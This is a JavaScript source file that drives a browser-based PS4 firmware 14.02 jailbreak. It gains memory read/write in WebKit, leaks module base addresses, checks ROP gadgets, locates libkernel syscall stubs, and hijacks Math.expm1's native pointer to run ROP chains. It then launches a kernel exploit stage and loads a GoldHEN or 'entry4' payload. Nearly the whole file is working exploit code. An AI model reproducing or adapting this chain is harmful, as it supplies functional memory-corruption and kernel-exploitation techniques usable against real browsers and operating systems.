import { params } from "./config.js";
import { establishPrimitive } from "./core.js";
import { installWindowP, pairStatus } from "./memory.js";
import { int64 } from "../../shared/int64.js";
import { offsetsFor, PS4 } from "./offsets.js";

let currentUI = null;
let running = false;

function mark(tag, detail) {
  if (currentUI) currentUI.log(tag, detail);
}

function state(t) {
  if (!currentUI) return;
  let pct = 30;
  if (/offset|fw/i.test(t)) pct = 20;
  else if (/primitive|groom|ssv|heap/i.test(t)) pct = 45;
  else if (/worker|cpuset|stubs|bases/i.test(t)) pct = 55;
  else if (/afterglow|race|wait|arm|kevent|leak/i.test(t)) pct = 70;
  else if (/patch|kpatch|padding/i.test(t)) pct = 85;
  else if (/payload|hen/i.test(t)) pct = 95;
  else if (/done|complete/i.test(t)) pct = 100;
  currentUI.setStatus(t, t, pct);
}

function check(name, ok, detail) {
  mark(ok ? "PROOF-OK" : "PROOF-FAIL", name + (detail ? "  " + detail : ""));
  return ok;
}

const SYS = {
  getpid: 20,
  getuid: 0x18,
  close: 6,
  socket: 97,
  socketpair: 0x87,
  getsockopt: 118,
  setsockopt: 0x69,
  mmap: 477,
  munmap: 73,
  thr_self: 432,
  getgroups: 79,
  getgid: 47,
  cpuset_getaffinity: 487,
  cpuset_setaffinity: 488,
  aio_multi_poll: 664,
  aio_multi_delete: 662,
  getegid: 43,
  aio_multi_wait: 663,
  aio_multi_cancel: 666,
  aio_submit_cmd: 669,
  write: 4,
  sysctl: 202,
  kill: 37,
  getppid: 39,
  open: 5,
  ioctl: 54,
  mprotect: 74,
  kqueue: 362,
  kevent: 363,
  dynlib_get_list: 592,
  dynlib_get_info: 593,
};
const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
const keepAlive = [];
let mainMf = null;
let mainOrig = null;
let mainArmed = false;

export async function runExploit(ui, payloadName = "entry4") {
  if (running) throw new Error("14.02 is already running");
  running = true;
  currentUI = ui;
  let p = null;
  let success = false;
  let message = "try again.";

  try {
    const { key, off } = offsetsFor(navigator.userAgent);
    mark("BUILD", "ag1402 base=webkitty-afterglow");
    mark("FW", key || "(not a PS4 UA)");
    if (!off) {
      state("not a PS4 browser - debug mode");
      mark("NONPS4-DEBUG", "ua=" + (navigator.userAgent || "unknown"));
      try {
        mark("NONPS4-OFFSETS", "supported=" + Object.keys(PS4).join(","));
      } catch (e) {
        mark("NONPS4-OFFSETS", "error=" + String(e));
      }
      message = "unsupported device.";
      return;
    }
    const fwKey = key;
    if (fwKey !== "14.02") {
      state("firmware mismatch");
      mark("FW-UNSUPPORTED", fwKey + " -- this 14.02 module runs on 14.02 only");
      message = "selected 14.02; detected ps4 " + fwKey + ".";
      return;
    }

    mark("FW-STATUS", off.fw_status || "none");
    state("running the primitive...");
    await new Promise((r) => setTimeout(r, 0));

    const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
    const attemptsArg = parseInt(params.get("attempts") || "8", 10);
    const ATTEMPTS = Number.isFinite(attemptsArg) && attemptsArg >= 1 ? attemptsArg : 8;
    const carrier = await establishPrimitive({
      maxAttempts: ATTEMPTS,
      onEvent: (t, d, a) =>
        (PRIMITIVE_LOUD.test(t) ? mark : () => {})(t, (a != null ? "[" + a + "] " : "") + (d || "")),
    });
    installWindowP(carrier, { promote: false });
    if (!window.p) throw new Error("window.p was not installed");
    p = window.p;
    mark("PAIR-STATUS", "state=" + pairStatus.state + " promoted=" + pairStatus.promoted);
    mark("PRIMITIVE-OK", "");

    const cell = p.leakval(Math.expm1);
    const nativeFn = p.read8(p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function));
    const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
    const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
    let libkernelBase = errorFn.sub32(off.k__error);
    // Afterglow hosts align libkernel down to the page: 14.0x ships the same
    // WebKit build as 13.52, so a low-12-bit residue is a slide, not a base.
    const libkernelAdjust = libkernelBase.low & 0x3fff;
    if (libkernelAdjust !== 0) {
      libkernelBase = libkernelBase.sub32(libkernelAdjust);
      mark("LIBKERNEL-ALIGN", "adjust=0x" + libkernelAdjust.toString(16) + " base=" + libkernelBase);
    }
    mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
    const aligned = (v) => v.hi > 0 && (v.low & 0x3fff) === 0;
    if (!check("module-bases-0x4000-aligned", aligned(webkitBase) && aligned(libkernelBase), "")) {
      message = "primitive failed.";
      return;
    }

    const G = {};
    const GAD = [
      ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
      ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
      ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
      ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
      ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
      ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
      ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
      ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
      ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET, [0x48, 0x89, 0x07, 0xc3]],
      ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30]],
      ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07]],
      ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5]],
      ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08]],
      ["G4", off.wk_MOV_RDX_RAX_18_CALL_10, [0x48, 0x8b, 0x50, off.pivot_view_sp]],
      ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3]],
    ];
    let gated = 0;
    for (const [nm, rva, pat] of GAD) {
      const a = webkitBase.add32(rva);
      let good = true;
      for (let i = 0; i < pat.length; ++i) {
        if (pat[i] === null) continue;
        if (p.read1(a.add32(i)) !== pat[i]) {
          good = false;
          break;
        }
      }
      if (good) {
        G[nm] = a;
        gated++;
      } else mark("GADGET-BAD", nm);
    }
    if (!check("gadget-table-fits-module", gated === GAD.length, gated + "/" + GAD.length)) {
      message = "unsupported webkit.";
      return;
    }
    const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET, G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];

    const stubAddr = new Map();
    let seeded = 0;
    if (off.k_stubs) {
      for (const numStr in off.k_stubs) {
        const num = +numStr;
        const o = off.k_stubs[numStr];
        const v = p.read8(libkernelBase.add32(o));
        if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
        if (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 !== num) continue;
        stubAddr.set(num, libkernelBase.add32(o));
        seeded++;
      }
    }
    const need = new Set(Object.keys(SYS).map((k) => SYS[k]).filter((n) => !stubAddr.has(n)));
    let scanned = 0;
    for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
      const v = p.read8(libkernelBase.add32(o));
      if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
      const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
      if (!need.has(num)) continue;
      stubAddr.set(num, libkernelBase.add32(o));
      need.delete(num);
      scanned++;
    }
    mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
    const miss = Object.keys(SYS).filter((k) => !stubAddr.has(SYS[k]));
    if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(","))) {
      message = "unsupported libkernel.";
      return;
    }

    function bufAddr(ab) {
      const c = p.leakval(ab);
      return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl)).add32(off.wk_ArrayBuffer_m_contents_m_data));
    }
    function put(dv, at, v) {
      if (typeof v === "number") {
        dv.setUint32(at, v >>> 0, true);
        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
      } else {
        dv.setUint32(at, v.low >>> 0, true);
        dv.setUint32(at + 4, v.hi >>> 0, true);
      }
    }
    const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
    function makeCtx() {
      const sb = new ArrayBuffer(0x20);
      const pb = new ArrayBuffer(PB_SIZE);
      const kb = new ArrayBuffer(0x2000);
      const fb = new ArrayBuffer(0x40);
      keepAlive.push(sb, pb, kb, fb);
      const c = {
        storeDv: new DataView(sb),
        pivotDv: new DataView(pb),
        stackDv: new DataView(kb),
        frameDv: new DataView(fb),
        stackU8: new Uint8Array(kb),
        frameU8: new Uint8Array(fb),
      };
      keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv, c.stackU8, c.frameU8);
      c.S = bufAddr(sb);
      c.P = bufAddr(pb);
      c.K = bufAddr(kb);
      c.F = bufAddr(fb);
      put(c.storeDv, 0x00, G.G1);
      put(c.storeDv, 0x08, c.P);
      put(c.storeDv, 0x10, G.G3);
      put(c.storeDv, 0x18, G.G2);
      put(c.pivotDv, 0x00, c.P);
      put(c.pivotDv, 0x10, G.G5);
      put(c.pivotDv, 0x20, G.G4);
      return c;
    }
    function layout(c, target, args) {
      c.stackU8.fill(0);
      c.frameU8.fill(0);
      const insts = [];
      for (let i = 0; i < args.length; ++i) {
        insts.push(argGadget[i]);
        insts.push(args[i]);
      }
      const targetIdx = insts.length;
      insts.push(target);
      insts.push(G.POP_RDI_RET);
      insts.push(c.F);
      insts.push(G.MOV_RDI_RAX_RET);
      insts.push(G.POP_RAX_RET);
      insts.push(JSVALUE_UNDEFINED);
      insts.push(G.LEAVE_RET);
      let at = 0x2000 - 8 * insts.length;
      if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
      for (let i = 0; i < insts.length; ++i) put(c.stackDv, at + 8 * i, insts[i]);
      put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
    }
    const M = makeCtx();
    mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
    mainOrig = p.read8(mainMf);
    const pivotObj = {};
    keepAlive.push(pivotObj);
    const pivotCell = p.leakval(pivotObj);
    p.write8(mainMf, G.G0);
    mainArmed = true;
    function callAddr(target, args) {
      layout(M, target, args);
      const saved = p.read8(pivotCell);
      p.write8(pivotCell, M.S);
      Math.expm1(pivotObj);
      p.write8(pivotCell, saved);
      return {
        lo: M.frameDv.getUint32(0, true),
        hi: M.frameDv.getUint32(4, true),
        i32: M.frameDv.getUint32(0, true) | 0,
      };
    }
    function prepareMany(calls) {
      const c = M;
      const RET = G.POP_RDI_RET.add32(1);
      const insts = [];
      for (let k = 0; k < calls.length; ++k) {
        const args = calls[k][1];
        for (let i = 0; i < args.length; ++i) {
          insts.push(argGadget[i]);
          insts.push(args[i]);
        }
        insts.push(calls[k][0]);
        if ((args.length * 2 + 1) % 2 === 1) insts.push(RET);
      }
      insts.push(G.POP_RDI_RET);
      insts.push(c.F);
      insts.push(G.MOV_RDI_RAX_RET);
      insts.push(G.POP_RAX_RET);
      insts.push(JSVALUE_UNDEFINED);
      insts.push(G.LEAVE_RET);
      let at = 0x2000 - 8 * insts.length;
      if (at < 0x40) throw new Error("prepareMany: " + calls.length + " does not fit");
      if (((c.K.low + at) & 0xf) !== 0) at -= 8;
      const bytes = new Uint8Array(8 * insts.length);
      const bdv = new DataView(bytes.buffer);
      for (let i = 0; i < insts.length; ++i) put(bdv, 8 * i, insts[i]);
      keepAlive.push(bytes, bdv);
      return { bytes, at, sp: c.K.add32(at) };
    }
    function runPrepared(prep) {
      const c = M;
      c.frameU8.fill(0);
      c.stackU8.set(prep.bytes, prep.at);
      put(c.pivotDv, off.pivot_view_sp, prep.sp);
      const saved = p.read8(pivotCell);
      p.write8(pivotCell, M.S);
      Math.expm1(pivotObj);
      p.write8(pivotCell, saved);
      return {
        lo: M.frameDv.getUint32(0, true),
        hi: M.frameDv.getUint32(4, true),
        i32: M.frameDv.getUint32(0, true) | 0,
      };
    }
    const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
    function errno() {
      const r = callAddr(errorFn, []);
      const a = new int64(r.lo, r.hi);
      return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
    }

    // Afterglow uses the explicit page override first, then payload_path.
    state("running afterglow...");
    if (typeof window.jailbreakSuccess !== "function") {
      try {
        window.jailbreakSuccess = function () {};
      } catch (e) {}
    }
    const isEntry4 = payloadName === "entry4";
    const payloadFile = isEntry4 ? "entry4.bin" : "goldhen_v2.4b18.14.bin";
    const payloadLabel = params.get("payload") ? "payload" : isEntry4 ? "entry4" : "goldhen v2.4b18.14";
    try {
      sessionStorage.setItem("payload_path", "src/firmware/1402/payloads/" + payloadFile);
    } catch (e) {
      mark("PAYLOAD-PATH", "sessionStorage unavailable: " + String((e && e.message) || e));
    }
    const { runAfterglow, probeAfterglow } = await import("./afterglow.js");
    const triesArg = parseInt(params.get("tries") || "4", 10);
    const tries = Number.isFinite(triesArg) && triesArg >= 1 && triesArg <= 8 ? triesArg : 4;
    // Probe parity with jb.js (?afterglow=probe): fires nothing, checks only.
    if (params.get("afterglow") === "probe") {
      const probed = probeAfterglow({
        p,
        callAddr,
        bufAddr,
        errno,
        params,
        keepAlive,
        mark,
        state,
        libkernelBase,
        webkitBase,
        stubAddr,
        off,
        fw: fwKey,
        prepareMany,
        runPrepared,
      });
      const okProbe = !!(probed && probed.ok);
      success = okProbe;
      message = okProbe ? "probe passed." : "probe failed.";
      return;
    }
    const iface = await runAfterglow(
      {
        p,
        callAddr,
        bufAddr,
        errno,
        params,
        keepAlive,
        mark,
        state,
        libkernelBase,
        webkitBase,
        stubAddr,
        off,
        fw: fwKey,
        prepareMany,
        runPrepared,
      },
      { tries }
    );
    // Same reporting basis as WebKitty finishUI(agOk): the interface object
    // is the jailbreak result; iface.payload is afterglow's own loader
    // verdict.
    if (!iface) {
      mark("AG-FAIL", "afterglow did not return a kernel interface");
      message = "exploit failed; retry.";
      return;
    }
    mark("AG-OK", "kernel interface live" + (iface.payload ? ", enabler running" : ", payload not loaded"));
    success = true;
    message = iface.payload ? `${payloadLabel} active.` : `jailbroken; ${payloadLabel} not loaded -- see log ([p]/[e] lines).`;
  } catch (err) {
    mark("THREW", String((err && err.message) || err));
    message = String((err && err.message) || err || "try again.");
  } finally {
    try {
      if (mainArmed && mainMf && mainOrig && p) {
        p.write8(mainMf, mainOrig);
        mainArmed = false;
      }
    } catch (e) {}
    running = false;
    try {
      currentUI.complete(success, message);
    } catch (e) {}
  }
}
